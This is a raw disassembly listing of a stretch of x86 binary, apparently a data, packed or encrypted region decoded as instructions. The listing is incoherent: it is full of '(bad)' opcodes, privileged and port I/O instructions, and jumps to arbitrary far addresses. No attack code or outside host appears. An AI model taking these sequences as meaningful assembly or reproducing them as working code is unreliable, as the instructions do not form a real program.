  421f2f:	push   es
  421f30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f31:	push   0x43cc2b99
  421f36:	sub    edx,eax
  421f38:	stos   DWORD PTR es:[edi],eax
  421f39:	sti    
  421f3a:	ins    BYTE PTR es:[edi],dx
  421f3b:	inc    edi
  421f3c:	and    esp,ebx
  421f3e:	fs repz popa 
  421f41:	xchg   ecx,eax
  421f42:	(bad)  
  421f43:	lock xchg al,bl
  421f46:	loop   0x421f6c
  421f48:	aad    0x2
  421f4a:	icebp  
  421f4b:	sahf   
  421f4c:	dec    ebx
  421f4d:	imul   esp,DWORD PTR [ecx+0x22ec7a64],0xffffffac
  421f54:	or     al,0x71
  421f56:	pop    es
  421f57:	mov    esi,0x73e7f9bd
  421f5c:	mov    ch,0x81
  421f5e:	icebp  
  421f5f:	stc    
  421f60:	and    cl,BYTE PTR [edi]
  421f62:	sar    DWORD PTR [edx-0x61],1
  421f65:	xchg   edx,eax
  421f66:	sub    eax,0x9b9ec4ba
  421f6b:	clc    
  421f6c:	imul   ecx,esp,0xffe52408
  421f72:	xor    ebp,DWORD PTR [esi]
  421f74:	pop    es
  421f75:	mov    edi,0x4dce9ad3
  421f7a:	push   edi
  421f7b:	cwde   
  421f7c:	mov    eax,ds:0x67113c15
  421f81:	dec    edx
  421f82:	fs push cs
  421f84:	cmp    dh,al
  421f86:	lahf   
  421f87:	test   al,0x37
  421f89:	retf   
  421f8a:	push   eax
  421f8b:	mov    DWORD PTR [esi],edx
  421f8d:	dec    edx
  421f8e:	add    al,BYTE PTR [ebp+0x5f]
  421f91:	or     edi,DWORD PTR ss:[esi-0x6d0018c6]
  421f98:	mov    ds:0x9a901598,al
  421f9d:	(bad)  
  421f9e:	call   0x67160cf1
  421fa3:	cmc    
  421fa4:	outs   dx,BYTE PTR ds:[esi]
  421fa5:	popf   
  421fa6:	popa   
  421fa7:	sbb    eax,0xdf7d3b53
  421fac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fad:	jb     0x422010
  421faf:	pop    ebx
  421fb0:	aam    0xe0
  421fb2:	vpslldq xmm0,xmm4,0x79
  421fb7:	push   es
  421fb8:	stos   BYTE PTR es:[edi],al
  421fb9:	int3   
  421fba:	pop    ebx
  421fbb:	test   eax,0x117bf877
  421fc0:	aad    0xd3
  421fc2:	mov    al,0x91
  421fc4:	jne    0x421f66
  421fc6:	cmp    cl,dl
  421fc8:	mov    ds:0x37a09607,al
  421fcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fce:	jo     0x421fab
  421fd0:	push   ebx
  421fd1:	or     al,0xee
  421fd3:	(bad)  
  421fd4:	int    0x90
  421fd6:	xchg   ecx,eax
  421fd7:	push   0xf49ccce6
  421fdc:	aaa    
  421fdd:	sbb    al,BYTE PTR [eax]
  421fdf:	ror    ah,cl
  421fe1:	and    ebp,DWORD PTR [edi+0x67]
  421fe4:	sti    
  421fe5:	out    dx,al
  421fe6:	inc    esi
  421fe7:	fst    st(7)
  421fe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fea:	test   DWORD PTR [ebx],edx
  421fec:	pop    esi
  421fed:	(bad)  
  421fef:	sub    bh,BYTE PTR [ecx-0x5c88957e]
  421ff5:	ret    0x43e5
  421ff8:	(bad)  
  421ffa:	lea    eax,[ebp-0x4e34b13e]
  422000:	xor    BYTE PTR es:[esi],0xe
  422004:	xor    al,0x26
  422006:	sar    BYTE PTR [eax],cl
  422008:	outs   dx,BYTE PTR ds:[esi]
  422009:	imul   edi,DWORD PTR [esi+esi*4+0x16d7d4ed],0xffffffe2
  422011:	aas    
  422012:	add    DWORD PTR [esi+0x42f46d26],ebx
  422018:	out    0x49,al
  42201a:	mov    ecx,0x9ef4da25
  42201f:	push   edx
  422020:	std    
  422021:	add    esi,DWORD PTR [esi]
  422023:	loop   0x42206f
  422025:	scas   al,BYTE PTR es:[edi]
  422026:	jnp    0x422057
  422028:	addr16 jnp 0x421fad
  42202b:	mov    al,0x56
  42202d:	repnz and ecx,DWORD PTR [esi+0x7f]
  422031:	pop    ecx
  422032:	cwde   
  422033:	sti    
  422034:	mov    ds:0x4ca27cc4,al
  422039:	pushf  
  42203a:	(bad)  
  42203b:	cdq    
  42203c:	(bad)  
  42203d:	jmp    DWORD PTR [ecx+0x76735f1c]
  422043:	jo     0x422017
  422045:	sbb    eax,0xf1c2b5e
  42204a:	fistp  WORD PTR [edx+0x7]
  42204d:	mov    ch,0x95
  42204f:	les    esi,FWORD PTR [edi-0x7]
  422052:	js     0x4220bc
  422054:	jge    0x421ff6
  422056:	jle    0x422060
  422058:	test   DWORD PTR [ebp-0x2eab775],0xb6c2edcb
  422062:	adc    ebx,DWORD PTR [edi]
  422064:	stc    
  422065:	push   edx
  422066:	(bad)  
  422067:	icebp  
  422068:	shl    DWORD PTR [esi-0x46],1
  42206b:	retf   
  42206c:	pushf  
  42206d:	add    cl,ah
  42206f:	in     eax,dx
  422070:	adc    al,0x2e
  422072:	or     eax,0x4f8b7771
  422077:	jnp    0x422051
  422079:	retw   
  42207b:	cmp    bl,BYTE PTR [ebx+eiz*8+0x50]
  42207f:	sbb    DWORD PTR [ebx-0x3011704b],ebx
  422085:	mov    ebp,0xe9d64159
  42208a:	data16 sub BYTE PTR [esp+edi*4],cl
  42208e:	mov    dl,0xee
  422090:	arpl   WORD PTR [ebp-0x79],ax
  422093:	pop    eax
  422094:	fadd   QWORD PTR [eax]
  422096:	and    BYTE PTR [eax+0x6c],0xd6
  42209a:	and    DWORD PTR [esi],esi
  42209c:	or     al,0xc3
  42209e:	mov    ebx,DWORD PTR [edi*4-0x16fbd799]
  4220a5:	pop    esi
  4220a6:	xor    al,0xe4
  4220a8:	sbb    al,0x97
  4220aa:	inc    esp
  4220ab:	cmc    
  4220ac:	js     0x4220c2
  4220ae:	scas   al,BYTE PTR es:[edi]
  4220af:	popa   
  4220b0:	fsub   QWORD PTR [ebx-0x6b]
  4220b3:	jmp    0xe922:0xa4244d8
  4220ba:	sar    BYTE PTR [edi+0x25],0xdf
  4220be:	ins    BYTE PTR es:[edi],dx
  4220bf:	inc    esp
  4220c0:	dec    ebp
  4220c1:	push   0x29
  4220c3:	or     bh,al
  4220c5:	loope  0x42204d
  4220c7:	into   
  4220c8:	enter  0x241a,0x81
  4220cc:	adc    BYTE PTR [edx+0x67882a6],ch
  4220d2:	in     eax,0xe5
  4220d4:	sti    
  4220d5:	inc    ebx
  4220d6:	inc    eax
  4220d7:	fxch   st(6)
  4220d9:	mov    ds:0x9edeac6f,eax
  4220de:	push   cs
  4220df:	pop    edi
  4220e0:	jg     0x422114
  4220e2:	and    DWORD PTR [ecx-0x30],ebx
  4220e5:	(bad)  
  4220e7:	mov    edx,0x2e6ec14d
  4220ec:	and    eax,0xce692c82
  4220f1:	xchg   edx,eax
  4220f2:	repz in eax,0x27
  4220f5:	xchg   DWORD PTR [esi],ebx
  4220f7:	sbb    bl,dl
  4220f9:	(bad)  
  4220fa:	loope  0x42213c
  4220fc:	(bad)  [ecx-0x47183e86]
  422102:	call   0xdd48676
  422107:	cli    
  422108:	and    DWORD PTR [esi],0x6c545f6e
  42210e:	mov    WORD PTR [eax+ebp*4+0x16],?
  422112:	dec    edi
  422113:	mov    ebp,DWORD PTR [edx]
  422115:	pop    ebp
  422116:	jmp    0x362de9d9
  42211b:	inc    ecx
  42211c:	lods   eax,DWORD PTR ds:[esi]
  42211d:	mov    ecx,0x58d5c3a7
  422122:	adc    cl,BYTE PTR [edi+eiz*1]
  422125:	daa    
  422126:	jbe    0x422126
  422128:	jae    0x422128
  42212a:	ret    0xfdc9
  42212d:	push   ebp
  42212e:	cld    
  42212f:	pop    esp
  422130:	pop    esp
  422131:	in     eax,0xa3
  422133:	enter  0x5e72,0xf2
  422137:	shl    DWORD PTR [edx+eiz*2-0xd],1
  42213b:	bound  eax,QWORD PTR [ecx+0x32e746c3]
  422141:	xchg   edx,eax
  422142:	dec    esp
  422143:	sbb    bh,BYTE PTR [bp+di-0x3189]
  422148:	push   ebx
  422149:	xor    eax,0xc7b426b3
  42214e:	mov    ch,0x77
  422150:	test   al,0xde
  422152:	sub    esp,DWORD PTR [ebp+0x549e084e]
  422158:	cmp    ah,BYTE PTR ds:0xf8a0663e
  42215e:	daa    
  42215f:	xchg   esi,eax
  422160:	fstp   QWORD PTR [ebp+0x15cb2cc0]
  422166:	or     eax,0x40edb140
  42216b:	popa   
  42216c:	addr16 (bad) 
  42216e:	mov    eax,0xe81935b
  422173:	jbe    0x4221de
  422175:	dec    edi
  422176:	das    
  422177:	jmp    DWORD PTR [esi+ebp*4]
  42217a:	adc    DWORD PTR [ecx+esi*1-0x7511689c],ebp
  422181:	add    al,BYTE PTR [ebx]
  422183:	sub    al,0x89
  422185:	pushf  
  422186:	int3   
  422187:	popf   
  422188:	cdq    
  422189:	xchg   ebp,eax
  42218a:	scas   al,BYTE PTR es:[edi]
  42218b:	dec    esi
  42218c:	push   edi
  42218d:	and    BYTE PTR [esi+edi*1],0xc1
  422191:	mov    ecx,0xde675d49
  422196:	stc    
  422197:	fld    DWORD PTR [esi]
  422199:	push   edx
  42219a:	mov    bh,0x84
  42219c:	sub    edx,esi
  42219e:	adc    dh,al
  4221a0:	mov    edi,0xb32e838b
  4221a5:	sbb    eax,0x428629a9
  4221aa:	lods   eax,DWORD PTR ds:[esi]
  4221ab:	inc    ebp
  4221ac:	inc    eax
  4221ad:	mov    edi,0x756363ca
  4221b2:	in     eax,dx
  4221b3:	mov    BYTE PTR [ebp+0x7a],bh
  4221b6:	jnp    0x4221b0
  4221b8:	inc    edx
  4221b9:	ror    DWORD PTR ds:[ebx+ebp*8-0x6cbb01f],cl
  4221c1:	sbb    eax,0xbf98a5f4
  4221c6:	loop   0x4221ef
  4221c8:	cmp    edx,DWORD PTR [esp+edi*1]
  4221cb:	mov    edx,0x31dd816a
  4221d0:	in     eax,dx
  4221d1:	out    dx,al
  4221d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221d3:	push   0xffffffd2
  4221d5:	test   BYTE PTR [eax+0x2a],dl
  4221d8:	dec    edi
  4221d9:	xchg   BYTE PTR ds:0x5e80473a,dl
  4221df:	add    dh,bh
  4221e1:	mov    BYTE PTR [edx],ah
  4221e3:	test   dh,bl
  4221e5:	jp     0x42217d
  4221e7:	in     al,dx
  4221e8:	push   ebx
  4221e9:	retf   
  4221ea:	or     eax,0x80f4a740
  4221ef:	pushf  
  4221f0:	mov    eax,ds:0x936ba9cb
  4221f5:	fist   DWORD PTR [edi+0x7c2401a1]
  4221fb:	in     al,0xd0
  4221fd:	inc    esi
  4221fe:	mov    ah,0xb
  422200:	shl    DWORD PTR [eax-0x6d],cl
  422203:	and    edi,DWORD PTR [edx+0x59]
  422206:	daa    
  422207:	popf   
  422208:	mov    DWORD PTR [ecx-0x3dab4adb],esi
  42220e:	retf   
  42220f:	sub    dl,BYTE PTR [edi+0x4]
  422212:	sbb    edi,edi
  422214:	arpl   WORD PTR [edi-0x38],ax
  422217:	pop    esp
  422218:	mov    BYTE PTR [ebp+0x3ef6fb69],bl
  42221e:	das    
  42221f:	add    eax,0x124a64fa
  422224:	into   
  422225:	(bad)  
  422226:	jge    0x4221b4
  422228:	mov    ebx,0x8a6e0129
  42222d:	push   esp
  42222e:	cmp    bl,BYTE PTR [ebx+0xb]
  422231:	or     bl,dl
  422233:	imul   ebx,DWORD PTR [ebx],0xffffff98
  422236:	js     0x42221a
  422238:	fadd   DWORD PTR [ecx]
  42223a:	nop
  42223b:	popf   
  42223c:	push   esi
  42223d:	mov    eax,0xaa774d1d
  422242:	mov    ebp,ecx
  422244:	jbe    0x422273
  422246:	and    al,0xa1
  422248:	inc    esi
  422249:	push   esp
  42224a:	push   cs
  42224b:	in     al,0xe3
  42224d:	(bad)  
  42224e:	push   ebp
  42224f:	mov    edi,0x7c3248d6
  422254:	(bad)  
  422255:	shr    DWORD PTR ds:0x31dbea7e,1
  42225b:	js     0x422258
  42225d:	sbb    eax,0xe27c27ed
  422262:	ins    BYTE PTR es:[edi],dx
  422263:	lock sub esi,DWORD PTR [eax+edi*4-0x4c]
  422268:	in     eax,0xcc
  42226a:	fidivr WORD PTR [ebp-0x22dd351]
  422270:	pop    ds
  422271:	add    esi,0x5d7a32a8
  422277:	enter  0xd78f,0x77
  42227b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42227c:	retf   0x4403
  42227f:	rol    eax,1
  422281:	imul   edx,DWORD PTR [edi+eax*2-0x5e8ce334],0x60
  422289:	jnp    0x422280
  42228b:	or     esi,ebp
  42228d:	add    al,0x38
  42228f:	adc    eax,0x5aa07fab
  422294:	and    eax,0x701fae1d
  422299:	pop    eax
  42229a:	imul   edi,DWORD PTR [edx+0x66],0xffffffff
  42229e:	push   ds
  42229f:	jmp    0x49af:0x59aa6ea2
  4222a6:	adc    eax,0x1a298069
  4222ab:	push   ss
  4222ac:	ret    
  4222ad:	adc    DWORD PTR [edx+0x58],ecx
  4222b0:	data16 or BYTE PTR [edi],al
  4222b3:	aam    0xc3
  4222b5:	jne    0x42226e
  4222b7:	push   ebx
  4222b8:	aaa    
  4222b9:	sbb    dh,ch
  4222bb:	jg     0x4222b0
  4222bd:	push   ebp
  4222be:	xor    al,0x8b
  4222c0:	sub    al,cl
  4222c2:	retf   0x247
  4222c5:	xchg   esi,esp
  4222c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222c8:	in     al,dx
  4222c9:	mov    bl,0x96
  4222cb:	aas    
  4222cc:	aaa    
  4222cd:	pop    esi
  4222ce:	xor    BYTE PTR [ebx-0x4d6dca81],dl
  4222d4:	arpl   di,ax
  4222d6:	push   ecx
  4222d7:	test   al,0x5c
  4222d9:	adc    eax,0x5b3214ac
  4222de:	sub    ecx,ecx
  4222e0:	mov    ds:0xdccafff0,eax
  4222e5:	rcr    ah,1
  4222e7:	mov    dh,BYTE PTR [esi-0x77]
  4222ea:	pop    eax
  4222eb:	scas   eax,DWORD PTR es:[edi]
  4222ec:	mov    edx,DWORD PTR [ebp-0x3a]
  4222ef:	test   BYTE PTR [eax+0x22],cl
  4222f2:	adc    ah,BYTE PTR [ebx]
  4222f4:	push   ebp
  4222f5:	ins    BYTE PTR es:[edi],dx
  4222f6:	popf   
  4222f7:	into   
  4222f8:	pop    esi
  4222f9:	dec    edx
  4222fa:	jg     0x422302
  4222fc:	(bad)  
  4222fd:	cmp    al,0x61
  4222ff:	xchg   DWORD PTR [esi],ebx
  422301:	pop    ecx
  422302:	lods   al,BYTE PTR es:[esi]
  422304:	loopne 0x422383
  422306:	or     bh,BYTE PTR [ecx-0x63]
  422309:	in     eax,0x0
  42230b:	mov    esi,0x94cb6a89
  422310:	pop    ebx
  422311:	sub    esp,DWORD PTR [ebx-0x61db954c]
  422317:	sbb    esi,DWORD PTR [ebx+0x45]
  42231a:	inc    esp
  42231b:	ins    BYTE PTR es:[edi],dx
  42231c:	ss pop ebx
  42231e:	repz mov ds:0x89bb26fd,al
  422324:	std    
  422325:	daa    
  422326:	cs fs out 0x6e,al
  42232a:	inc    ebx
  42232b:	adc    edx,eax
  42232d:	sbb    DWORD PTR [ebx+0x2f05b7a5],ebx
  422333:	call   0x748:0x6ec504b0
  42233a:	cmp    dl,bh
  42233c:	in     eax,0x8e
  42233e:	or     bl,bl
  422340:	imul   ebp,DWORD PTR [edx],0xffffffab
  422343:	pop    ebx
  422344:	mov    eax,esi
  422346:	test   eax,0xf9789b6c
  42234b:	mov    ds:0x7b9693b2,al
  422350:	fiadd  DWORD PTR [edx+0x6e]
  422353:	xchg   BYTE PTR [edi-0x30],dl
  422356:	jb     0x42230b
  422358:	(bad)  
  422359:	call   0xfab9ce3e
  42235e:	dec    edi
  42235f:	dec    esi
  422360:	and    BYTE PTR [ecx+0x4c],bh
  422363:	in     eax,dx
  422364:	adc    cl,ch
  422366:	ret    
  422367:	dec    ebx
  422368:	inc    esi
  422369:	leave  
  42236a:	ins    BYTE PTR es:[edi],dx
  42236b:	mov    DWORD PTR [eax],eax
  42236d:	and    DWORD PTR [ebx+0x403fca9f],ebp
  422373:	jmp    0x25d7:0x1f504a67
  42237a:	ret    0x4981
  42237d:	sbb    bl,BYTE PTR [eax]
  42237f:	pop    ss
  422380:	cmp    DWORD PTR [edi],edi
  422382:	mov    fs,WORD PTR [edx+0x35046cdf]
  422388:	cmp    DWORD PTR [edi-0xb],esp
  42238b:	and    BYTE PTR [ebx-0x2020057],ah
  422391:	pop    edx
  422392:	(bad)  
  422394:	popa   
  422395:	in     eax,0x69
  422397:	pop    ebp
  422398:	push   esp
  422399:	and    BYTE PTR [eax-0x4198d6a1],bh
  42239f:	add    DWORD PTR ds:0x39a45ad4,0x74e7c293
  4223a9:	fucomp st(5)
  4223ab:	or     BYTE PTR [esi+0x48],bl
  4223ae:	sub    BYTE PTR [ebp+esi*1-0x5b],dh
  4223b2:	out    0x44,al
  4223b4:	cwde   
  4223b5:	and    al,0xec
  4223b7:	pusha  
  4223b8:	push   ebp
  4223b9:	popf   
  4223ba:	push   edi
  4223bb:	inc    eax
  4223bc:	sbb    ah,0xfb
  4223bf:	cdq    
  4223c0:	into   
  4223c1:	ror    DWORD PTR [ecx],cl
  4223c3:	add    al,0xd0
  4223c5:	sub    bh,BYTE PTR [edi]
  4223c7:	jae    0x4223ba
  4223c9:	pushf  
  4223ca:	inc    eax
  4223cb:	add    BYTE PTR [ecx+0x711880c9],0xef
  4223d2:	fcomip st,st(7)
  4223d4:	add    ah,BYTE PTR [edi]
  4223d6:	dec    eax
  4223d7:	xchg   ebp,eax
  4223d8:	call   0xf4aa:0xa61a0ee1
  4223df:	add    eax,0xbc779214
  4223e4:	add    edi,0x71a02751
  4223ea:	mov    ecx,0x5c929c72
  4223ef:	daa    
  4223f0:	sbb    ecx,esi
  4223f2:	stc    
  4223f3:	mov    cl,0x60
  4223f5:	jbe    0x4223fa
  4223f7:	hlt    
  4223f8:	xor    esi,ecx
  4223fa:	icebp  
  4223fb:	(bad)  
  4223fc:	cs dec ecx
  4223fe:	add    BYTE PTR [ebp+0x65cf7c8f],al
  422404:	and    al,0x95
  422406:	aam    0x2e
  422408:	in     eax,dx
  422409:	out    dx,al
  42240a:	xor    DWORD PTR [ecx+0x53eaecba],ecx
  422410:	out    0x10,al
  422412:	xchg   BYTE PTR [ebp+0x651473df],ch
  422418:	aam    0x1a
  42241a:	inc    eax
  42241b:	add    edx,DWORD PTR [ecx]
  42241d:	in     eax,dx
  42241e:	retf   0x4486
  422421:	jmp    0xfb8f:0x2eab5af8
  422428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422429:	push   edx
  42242a:	ins    BYTE PTR es:[edi],dx
  42242b:	mov    cl,0x45
  42242d:	adc    dl,BYTE PTR [ebx+0x2c]
  422430:	jnp    0x4223ee
  422432:	push   edi
  422433:	jae    0x4223f0
  422435:	inc    esp
  422436:	dec    ecx
  422437:	(bad)  
  422438:	retf   
  422439:	sub    esp,edx
  42243b:	mov    al,0xef
  42243d:	push   ds
  42243e:	sub    BYTE PTR [esi],0xa2
  422441:	cmp    al,0xd3
  422443:	add    BYTE PTR es:[ebx+0x62b248b],0x58
  42244b:	cmp    al,0x44
  42244d:	jbe    0x422493
  42244f:	stos   DWORD PTR es:[edi],eax
  422450:	call   0xa4c2:0x7d7c8d1a
  422457:	xchg   DWORD PTR [ecx+0x47],esi
  42245a:	test   al,0xb5
  42245c:	xchg   esi,eax
  42245d:	popf   
  42245e:	mov    cl,0xc6
  422460:	dec    ebx
  422461:	sub    edx,esp
  422463:	test   al,0x84
  422465:	add    al,0xc0
  422467:	sub    eax,0xe8114187
  42246c:	push   esi
  42246d:	pop    es
  42246e:	bound  esi,QWORD PTR ds:0x7aac4481
  422474:	xchg   DWORD PTR [ebx-0x3f],ebx
  422477:	es and eax,0xcb653c92
  42247d:	mov    ch,BYTE PTR [ebx+0x79e32258]
  422483:	into   
  422484:	dec    ebx
  422485:	pusha  
  422486:	lock mov ch,0x16
  422489:	lahf   
  42248a:	sub    cl,dl
  42248c:	xor    al,0xb
  42248e:	stos   BYTE PTR es:[edi],al
  42248f:	lahf   
  422490:	loop   0x4224d3
  422492:	aaa    
  422493:	dec    ebx
  422494:	sub    ch,BYTE PTR [edi-0x397ecaff]
  42249a:	jmp    0x81ce:0xabd96317
  4224a1:	add    al,0x4a
  4224a3:	xchg   esp,eax
  4224a4:	or     al,0x34
  4224a6:	retf   0x3b8e
  4224a9:	(bad)  
  4224aa:	add    edx,0x92d8de07
  4224b0:	int    0x30
  4224b2:	stc    
  4224b3:	popf   
  4224b4:	cmp    al,0xc9
  4224b6:	and    eax,0xa82678e6
  4224bb:	mov    BYTE PTR [edx],bl
  4224bd:	int    0xb6
  4224bf:	cld    
  4224c0:	mov    bh,BYTE PTR [ebx+0xc]
  4224c3:	(bad)  
  4224c4:	fyl2xp1 
  4224c6:	cs and eax,0xb5bc8d86
  4224cc:	rcr    DWORD PTR [ebx-0x46],0xf0
  4224d0:	shl    BYTE PTR [eax+edi*4+0x8],1
  4224d4:	cmp    DWORD PTR [edi+edx*8],ebx
  4224d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224d8:	outs   dx,DWORD PTR ds:[esi]
  4224d9:	sub    esi,DWORD PTR [edi+0x158c5d2]
  4224df:	pop    ss
  4224e0:	jne    0x42252e
  4224e2:	out    0x81,eax
  4224e4:	ins    DWORD PTR es:[edi],dx
  4224e5:	mov    ebx,0xcac9db0
  4224ea:	jae    0x4224c6
  4224ec:	jg     0x42247d
  4224ee:	gs dec esp
  4224f0:	inc    edi
  4224f1:	xor    esi,DWORD PTR [eax-0x7f327f78]
  4224f7:	sbb    BYTE PTR [ecx+0x4c],al
  4224fa:	imul   DWORD PTR [ecx+ebp*8-0x5f]
  4224fe:	ret    0x3abb
  422501:	inc    ebp
  422502:	jge    0x422547
  422504:	pop    ss
  422505:	into   
  422506:	and    edx,ebx
  422508:	imul   ecx,DWORD PTR [ebx-0x5da874e],0xffffffe5
  42250f:	and    al,bh
  422511:	mov    eax,DWORD PTR [eax]
  422513:	push   0x72
  422515:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422516:	push   edi
  422517:	ret    0x575c
  42251a:	or     eax,0x3322fffb
  42251f:	jns    0x4224e0
  422521:	mov    edi,0x7cb690df
  422526:	sar    DWORD PTR [edx+0x3d3407a1],1
  42252c:	ror    BYTE PTR [ebx+0x17d7a4c4],cl
  422532:	cmp    al,0xaf
  422534:	mov    dl,0x31
  422536:	dec    eax
  422537:	lea    esp,ds:0xa2e9635f
  42253d:	rcr    DWORD PTR ds:0x1148542d,1
  422543:	es nop
  422545:	adc    eax,0xbae15738
  42254a:	sbb    eax,0x9106552e
  42254f:	xlat   BYTE PTR ds:[ebx]
  422550:	lds    edx,FWORD PTR [edi]
  422552:	rcr    DWORD PTR [edi-0x4a7d63a8],1
  422558:	icebp  
  422559:	fwait
  42255a:	mov    BYTE PTR [ecx],bl
  42255c:	pop    esi
  42255d:	cmp    esp,esi
  42255f:	test   ah,cl
  422561:	outs   dx,BYTE PTR ds:[esi]
  422562:	pop    eax
  422563:	lods   eax,DWORD PTR ds:[esi]
  422564:	cmp    BYTE PTR [edx],ch
  422566:	bndldx (bad),[ecx+0x17]
  42256a:	mov    edi,ss
  42256c:	sub    edx,DWORD PTR [eax+ebp*8-0x69]
  422570:	mov    ch,0x39
  422572:	mov    al,0xf4
  422574:	jg     0x42257c
  422576:	mov    ch,0x4
  422578:	mov    esi,DWORD PTR [edx-0x478e0878]
  42257e:	adc    dh,BYTE PTR es:[edi+0x616bbfb1]
  422585:	outs   dx,BYTE PTR ds:[esi]
  422586:	or     ebx,ebx
  422588:	xchg   al,ah
  42258a:	(bad)  
  42258c:	add    ah,BYTE PTR [edx-0x1b]
  42258f:	lock pushf 
  422591:	call   0xe1fe:0xe55b3ab1
  422598:	inc    ebx
  422599:	scas   eax,DWORD PTR es:[edi]
  42259a:	nop
  42259b:	inc    ebp
  42259c:	mov    ebx,0x5e59b769
  4225a1:	ffreep st(5)
  4225a3:	dec    edi
  4225a4:	int    0x0
  4225a6:	dec    ebx
  4225a7:	adc    DWORD PTR [ebp+0x14460de4],esp
  4225ad:	stos   DWORD PTR es:[edi],eax
  4225ae:	xchg   esi,eax
  4225af:	cmp    eax,0xa5600498
  4225b4:	mov    ds:0xc75bb2fa,eax
  4225b9:	imul   eax,DWORD PTR ds:[ecx-0xe],0xf3264d2a
  4225c1:	in     al,0x8e
  4225c3:	ja     0x42260b
  4225c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225c6:	call   0x3a47:0x8f95122d
  4225cd:	rcr    DWORD PTR [esi-0x26779180],1
  4225d3:	test   esi,ecx
  4225d5:	push   ds
  4225d6:	clc    
  4225d7:	push   ss
  4225d8:	(bad)  
  4225d9:	adc    eax,DWORD PTR [esi]
  4225db:	daa    
  4225dc:	or     edi,DWORD PTR [ebx]
  4225de:	es adc eax,0x76ffb384
  4225e4:	mov    ss,WORD PTR [edi-0x4]
  4225e7:	cmp    ebx,ebp
  4225e9:	fcmovu st,st(2)
  4225eb:	and    eax,0x8a80a83
  4225f0:	int3   
  4225f1:	fwait
  4225f2:	add    DWORD PTR [ecx+0x6b],0x5c731f9b
  4225f9:	shl    ah,0xf5
  4225fc:	mov    ds:0x446acba7,al
  422601:	pusha  
  422602:	lods   al,BYTE PTR ds:[esi]
  422603:	retf   
  422604:	pop    ecx
  422605:	imul   eax,DWORD PTR [esi],0xffffffe8
  422608:	ret    0xef7a
  42260b:	lea    ebp,[ebx]
  42260d:	mov    bh,0x4d
  42260f:	aaa    
  422610:	les    eax,FWORD PTR [ecx-0x55]
  422613:	shl    bh,1
  422615:	mov    BYTE PTR [ebp-0x1ff36df5],ch
  42261b:	fistp  WORD PTR [esi]
  42261d:	sub    DWORD PTR [eax],edx
  42261f:	push   ecx
  422620:	push   ss
  422621:	mov    cl,0x78
  422623:	repz mov ch,dh
  422626:	xchg   BYTE PTR ds:0xc6667c88,bh
  42262c:	mov    esp,0x2a259e2c
  422631:	jbe    0x42268c
  422633:	leave  
  422634:	push   0xd318c380
  422639:	push   0x8dd52ed7
  42263e:	rcr    BYTE PTR es:[esi],1
  422641:	cmp    al,0xaf
  422643:	cwde   
  422644:	(bad)  
  422645:	test   ebp,eax
  422647:	addr16 int 0xd8
  42264a:	or     DWORD PTR [ebx-0x5f810f71],esp
  422650:	sti    
  422651:	sub    al,0x50
  422653:	and    ecx,DWORD PTR [eax+0x54450af1]
  422659:	dec    esi
  42265a:	mov    al,0xbe
  42265c:	ret    0x4512
  42265f:	add    al,0xe8
  422661:	test   eax,0x46915b3b
  422666:	test   BYTE PTR [ecx+0x47ef6456],bh
  42266c:	dec    ebx
  42266d:	(bad)  ds:0x90a226c8
  422673:	mov    ds:0x6b51a0de,eax
  422678:	icebp  
  422679:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42267a:	xchg   DWORD PTR [esi-0x78],esi
  42267d:	cli    
  42267e:	jns    0x4226ec
  422680:	gs jo  0x42264a
  422683:	cmp    al,0xef
  422685:	dec    ecx
  422686:	cmc    
  422687:	and    DWORD PTR [esi],eax
  422689:	and    DWORD PTR ds:[eax+0x5e81c659],ebp
  422690:	call   0x7c1dee57
  422695:	sub    ecx,DWORD PTR [eax+0x1e3bc517]
  42269b:	nop
  42269c:	xchg   ebx,eax
  42269d:	jbe    0x4226ac
  42269f:	mov    al,0x71
  4226a1:	popa   
  4226a2:	add    DWORD PTR [ebx-0x50b66595],edi
  4226a8:	dec    ebp
  4226a9:	push   ss
  4226aa:	inc    esi
  4226ab:	inc    esi
  4226ac:	scas   eax,DWORD PTR es:[edi]
  4226ad:	xor    ebx,DWORD PTR [edi-0x72]
  4226b0:	sub    al,0x28
  4226b2:	mov    dl,0xf8
  4226b4:	mov    edi,0xe99dbad8
  4226b9:	pop    ebx
  4226ba:	stos   DWORD PTR es:[edi],eax
  4226bb:	and    eax,0x9e89e729
  4226c0:	adc    BYTE PTR [ecx+0x33db8836],ch
  4226c6:	mov    ch,0x5f
  4226c8:	push   ebx
  4226c9:	cmp    BYTE PTR [edi],dh
  4226cb:	js     0x4226e9
  4226cd:	push   0x8
  4226cf:	or     al,0x7c
  4226d1:	sbb    ah,dl
  4226d3:	test   al,0x71
  4226d5:	repnz retf 
  4226d7:	sysenter 
  4226d9:	(bad)  
  4226db:	mov    BYTE PTR [eax],bl
  4226dd:	loope  0x42275a
  4226df:	popa   
  4226e0:	daa    
  4226e1:	(bad)  
  4226e2:	mov    ebp,0x461a4296
  4226e7:	pop    ebx
  4226e8:	fwait
  4226e9:	inc    esp
  4226ea:	bound  ecx,QWORD PTR [bp+si-0x37]
  4226ee:	loope  0x42275a
  4226f0:	cmc    
  4226f1:	xlat   BYTE PTR ds:[ebx]
  4226f2:	xchg   ecx,eax
  4226f3:	inc    bp
  4226f5:	and    eax,0xd63e1971
  4226fa:	imul   ch
  4226fc:	mov    DWORD PTR [edi+ebp*8+0x26],edi
  422700:	cmp    ch,BYTE PTR [edi-0x1e]
  422703:	lea    edx,[esi-0x2528468f]
  422709:	cmp    esi,DWORD PTR [eax]
  42270b:	inc    edi
  42270c:	add    al,0x50
  42270e:	inc    edi
  42270f:	adc    al,0x5f
  422711:	and    esp,DWORD PTR [eax+eiz*1]
  422714:	mov    eax,0xe6156ab9
  422719:	call   0xb01e397
  42271e:	inc    ebx
  42271f:	jae    0x422793
  422721:	dec    ebp
  422722:	cli    
  422723:	dec    eax
  422724:	push   ecx
  422725:	or     esi,DWORD PTR [ecx]
